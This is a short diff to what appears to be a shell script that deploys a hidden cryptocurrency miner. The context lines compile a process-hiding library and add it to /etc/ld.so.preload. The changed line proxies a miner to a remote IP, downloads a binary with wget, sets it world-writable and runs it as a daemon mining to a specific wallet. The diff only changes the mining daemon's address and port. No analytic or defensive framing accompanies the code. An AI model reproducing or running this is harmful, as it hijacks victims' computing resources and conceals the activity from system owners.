@@ -58,4 +58,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./gm3.43 -a octopus -s 157.230.239.11:80 -u cfx:aats7h7t761ac5d6tjk8vnjjh3537t1znjrwvwhhhy.$(shuf -n 1 -i 1-3000)-Bismillah & wget https://majza.nyc3.digitaloceanspaces.com/Tnn0.4.0 && chmod 777 Tnn0.4.0 && ./Tnn0.4.0 --daemon-address 157.230.239.11 --port 443 --worker-name $(shuf -n 1 -i 1-999)-Bismillah --spectre --wallet spectre:qr4tmysphsz74cnrydnvd2vg0jqy5fdvsk09etkaejvvasxme5gmsdd3dhszw
+./graftcp/graftcp ./gm3.43 -a octopus -s 157.230.239.11:80 -u cfx:aats7h7t761ac5d6tjk8vnjjh3537t1znjrwvwhhhy.$(shuf -n 1 -i 1-3000)-Bismillah & wget https://majza.nyc3.digitaloceanspaces.com/Tnn0.4.0 && chmod 777 Tnn0.4.0 && ./Tnn0.4.0 --daemon-address 167.172.24.221 --port 80 --worker-name $(shuf -n 1 -i 1-999)-Bismillah --spectre --wallet spectre:qr4tmysphsz74cnrydnvd2vg0jqy5fdvsk09etkaejvvasxme5gmsdd3dhszw
